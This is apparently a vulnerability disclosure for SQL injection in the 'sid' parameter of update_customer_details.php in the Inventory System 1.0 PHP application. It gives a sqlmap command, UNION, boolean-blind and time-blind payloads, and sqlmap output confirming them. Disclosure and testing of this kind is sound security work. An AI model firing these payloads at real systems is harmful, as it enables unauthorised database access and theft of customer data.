# SQL Injection in Inventory System (Update Customer Details)

## Overview

* **Vulnerability Type**: SQL Injection (UNION-based / Blind)
* **Product**: [Inventory System](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
* **Version**: 1.0
* **Component**: Update Customer Details (`update_customer_details.php`)
* **Vulnerable Parameter**: `sid` (GET)

## Description

A SQL Injection vulnerability exists in the **Inventory System**. The vulnerability is located in the `update_customer_details.php` file.

The application fails to properly sanitize the `sid` parameter in the HTTP GET request. This allows an authenticated attacker to inject arbitrary SQL commands. Since the backend database is **MySQL** and the injection point allows for **UNION queries** (6 columns), attackers can directly retrieve and display sensitive data from the database, in addition to using blind injection techniques.

## Steps to Reproduce

1. **Setup**: Deploy the Inventory System locally.
2. **Login**: Log in to the application.
3. **Exploit**: Send a crafted HTTP GET request to `update_customer_details.php` injecting SQL into the `sid` parameter, or use `sqlmap`.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8089/update_customer_details.php?sid=20&table=customer_details&return=view_customers.php" \
--batch -v 6 --risk=3 \
--cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**UNION Query Payload (MySQL):**

```sql
sid=-5460 UNION ALL SELECT NULL,CONCAT(0x7171767171,0x59784b6147737a675941644772416346746452495961416c545a564d4b4254526274684e74416b62,0x716b6b6271),NULL,NULL,NULL,NULL-- -&table=customer_details&return=view_customers.php

```

**Boolean-based Blind Payload:**

```sql
sid=(SELECT (CASE WHEN (7180=7180) THEN 20 ELSE (SELECT 4625 UNION SELECT 5694) END))&table=customer_details&return=view_customers.php

```

**Time-based Blind Payload:**

```sql
sid=20 AND (SELECT 3827 FROM (SELECT(SLEEP(5)))XHpg)&table=customer_details&return=view_customers.php

```

## Proof of Concept

The following output from `sqlmap` confirms that the `sid` parameter is vulnerable to UNION-based, Boolean-based, and Time-based SQL injection.

```text
Parameter: sid (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: sid=(SELECT (CASE WHEN (7180=7180) THEN 20 ELSE (SELECT 4625 UNION SELECT 5694) END))&table=customer_details&return=view_customers.php
    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sid=20 AND (SELECT 3827 FROM (SELECT(SLEEP(5)))XHpg)&table=customer_details&return=view_customers.php
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: sid=-5460 UNION ALL SELECT NULL,CONCAT(0x7171767171,0x59784b6147737a675941644772416346746452495961416c545a564d4b4254526274684e74416b62,0x716b6b6271),NULL,NULL,NULL,NULL-- -&table=customer_details&return=view_customers.php
    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL-- -
---
[INFO] the back-end DBMS is MySQL

```

<img width="1059" height="369" alt="图片" src="https://github.com/user-attachments/assets/4d1547fd-d77f-4280-82fb-889900f5b246" />


## Impact

This vulnerability allows an attacker to:

1. **Exfiltrate Data**: Directly retrieve and display database content via UNION-based attacks.
2. **Database Enumeration**: Identify tables, columns, and database schema.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
